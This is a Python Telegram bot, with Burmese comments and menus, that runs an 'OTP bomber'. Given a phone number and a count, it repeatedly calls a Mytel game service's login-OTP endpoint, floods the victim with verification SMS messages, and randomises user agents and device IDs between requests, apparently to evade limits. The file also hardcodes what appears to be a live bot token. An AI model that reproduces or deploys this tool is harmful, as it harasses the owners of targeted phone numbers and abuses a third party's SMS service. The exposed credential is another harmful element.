import telebot
from telebot import types
import requests
import time
import threading
import random
import uuid

# Bot Token ကို တိုက်ရိုက်ထည့်သွင်းထားပါသည်
TOKEN = '8183997269:AAElovxXFRd40oatzEtSnKpVm8UAheNvAQw'
bot = telebot.TeleBot(TOKEN)

# API Base URL
BASE_URL = "https://mytel.bubblepop.info/game-service/v1"

# ယာယီ သိမ်းဆည်းရန် Dictionary များ (User တစ်ဦးချင်းစီ၏ Time Limit ချိန်ညှိချက်များအတွက်)
user_settings = {}
active_bombers = {}

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_start = types.InlineKeyboardButton("🚀 စတင်ရန် (/bomb)", callback_data="menu_start")
    btn_time = types.InlineKeyboardButton("⏱️ Time Limit ပြင်ရန်", callback_data="menu_time")
    btn_help = types.InlineKeyboardButton("ℹ️ အကူအညီ", callback_data="menu_help")
    markup.add(btn_start, btn_time, btn_help)
    
    bot.reply_to(message, "🤖 Mytel OTP Bomber Bot မှ ကြိုဆိုပါတယ်။\nအောက်ပါ ခလုတ်များကို အသုံးပြုနိုင်ပါသည် -", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    if call.data == "menu_start":
        bot.send_message(chat_id, "📱 ကျေးဇူးပြု၍ ဖုန်းနံပါတ်နှင့် အကြိမ်ရေကို ဤကဲ့သို့ ပို့ပေးပါ။\n\nဥပမာ: `/bomb 09912345678 50`\n(အကြိမ်ရေကို ကြိုက်သလောက် ထည့်နိုင်ပါပြီ)", parse_mode="Markdown")
        
    elif call.data == "menu_time":
        current_time = user_settings.get(chat_id, 10) # Default က ၁၀ စက္ကန့်
        markup = types.InlineKeyboardMarkup(row_width=3)
        btn_5 = types.InlineKeyboardButton("5 စက္ကန့်", callback_data="set_time_5")
        btn_10 = types.InlineKeyboardButton("10 စက္ကန့်", callback_data="set_time_10")
        btn_20 = types.InlineKeyboardButton("20 စက္ကန့်", callback_data="set_time_20")
        btn_30 = types.InlineKeyboardButton("30 စက္ကန့်", callback_data="set_time_30")
        btn_60 = types.InlineKeyboardButton("60 စက္ကန့်", callback_data="set_time_60")
        btn_back = types.InlineKeyboardButton("🔙 ပင်မမီနူးသို့", callback_data="menu_start")
        markup.add(btn_5, btn_10, btn_20, btn_30, btn_60, btn_back)
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"⏱️ **လက်ရှိ Time Limit:** `{current_time} စက္ကန့်`\n\nအောက်ပါတို့မှ လိုချင်သော စောင့်ဆိုင်းချိန်ကို ရွေးချယ်ပါ -",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    elif call.data.startswith("set_time_"):
        t_val = int(call.data.split("_")[2])
        user_settings[chat_id] = t_val
        bot.answer_callback_query(call.id, text=f"✅ Time Limit ကို {t_val} စက္ကန့်သို့ ပြောင်းပြီးပါပြီ။")
        
        # မီနူးကို ပြန်ပြရန်
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn_start = types.InlineKeyboardButton("🚀 စတင်ရန် (/bomb)", callback_data="menu_start")
        btn_time = types.InlineKeyboardButton("⏱️ Time Limit ထပ်ပြင်ရန်", callback_data="menu_time")
        markup.add(btn_start, btn_time)
        
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"✅ **အောင်မြင်ပါသည်။**\nလက်ရှိ Time Limit မှာ **{t_val} စက္ကန့်** ဖြစ်သွားပါပြီ။",
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    elif call.data == "menu_help":
        bot.send_message(chat_id, "ℹ️ **အသုံးပြုပုံ ညွှန်ကြားချက်**\n\n- `/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>` ဟု ရိုက်ထည့်ပါ။\n- ဥပမာ: `/bomb 09912345678 100`\n- အကြိမ်ရေကို လွတ်လပ်စွာ (ကြိုက်သလောက်) ထည့်နိုင်ပါသည်။\n- ⏱️ Time Limit ကို ခလုတ်နှိပ်၍ ကိုယ်တိုင် ချိန်ညှိနိုင်ပါသည်။", parse_mode="Markdown")

@bot.message_handler(commands=['bomb'])
def start_bombing(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ ပုံစံမမှန်ပါ။ ဤကဲ့သို့ ရိုက်ထည့်ပါ:\n`/bomb <ဖုန်းနံပါတ်> <အကြိမ်ရေ>`", parse_mode="Markdown")
        return

    phone_number = args[1]
    try:
        count = int(args[2])
    except ValueError:
        bot.reply_to(message, "❌ အကြိမ်ရေသည် ဂဏန်းဖြစ်ရပါမည်။")
        return

    chat_id = message.chat.id
    # သတ်မှတ်ထားသော Time Limit ရှိမရှိ စစ်ဆေးမည် (မရှိရင် default ၁၀ စက္ကန့်)
    delay_time = user_settings.get(chat_id, 10)

    markup = types.InlineKeyboardMarkup()
    btn_stop = types.InlineKeyboardButton("🛑 ရပ်တန့်မည်", callback_data=f"stop_{chat_id}")
    markup.add(btn_stop)

    msg = bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 စုစုပေါင်းအကြိမ်ရေ: `{count}` ကြိမ်\n⏱️ Time Limit: `{delay_time} စက္ကန့်` ခြားထားသည်", parse_mode="Markdown", reply_markup=markup)

    # Stop flag အတွက် active_bombers ထဲထည့်ခြင်း
    active_bombers[chat_id] = True

    threading.Thread(target=run_bomber, args=(chat_id, msg.message_id, phone_number, count, delay_time)).start()

def run_bomber(chat_id, msg_id, phone_number, count, delay_time):
    success_count = 0
    fail_count = 0

    url = f"{BASE_URL}/user/loginOtp"

    user_agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
    ]

    for i in range(count):
        # ရပ်တန့်ခလုတ် နှိပ်ထားခြင်းရှိမရှိ စစ်ဆေးရန်
        if not active_bombers.get(chat_id, True):
            break

        try:
            session = requests.Session()
            device_id = str(uuid.uuid4())
            
            headers = {
                "User-Agent": random.choice(user_agents),
                "Content-Type": "application/json",
                "Accept": "application/json, text/plain, */*",
                "X-Request-ID": device_id,
                "X-Device-Id": device_id,
                "Origin": "https://mytel.bubblepop.info",
                "Referer": "https://mytel.bubblepop.info/"
            }
            
            payload = {
                "msisdn": phone_number,
                "uuid": device_id
            }
            
            response = session.post(url, json=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                success_count += 1
            else:
                fail_count += 1
                
        except Exception as e:
            fail_count += 1

        # နောက်ဆုံးတစ်ကြိမ် မရောက်သေးရင် သတ်မှတ်ထားတဲ့ Delay Time အတိုင်း စောင့်မည်
        if i < count - 1 and active_bombers.get(chat_id, True):
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=msg_id,
                    text=f"🚀 လုပ်ဆောင်နေဆဲ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 ပြီးမြောက်မှု: `{i+1}/{count}` ကြိမ်\n⏱️ နောက်တစ်ကြိမ်သို့: `{delay_time} စက္ကန့်` စောင့်ဆိုင်းနေသည်...",
                    parse_mode="Markdown"
                )
            except:
                pass
            
            time.sleep(delay_time)

    if chat_id in active_bombers:
        del active_bombers[chat_id]

    bot.send_message(chat_id, f"✅ **Bomber ပြီးဆုံးပါပြီ!**\n\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n✨ အောင်မြင်မှု: `{success_count}` ကြိမ်\n❌ မှားယွင်းမှု: `{fail_count}` ကြိမ်", parse_mode="Markdown")

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
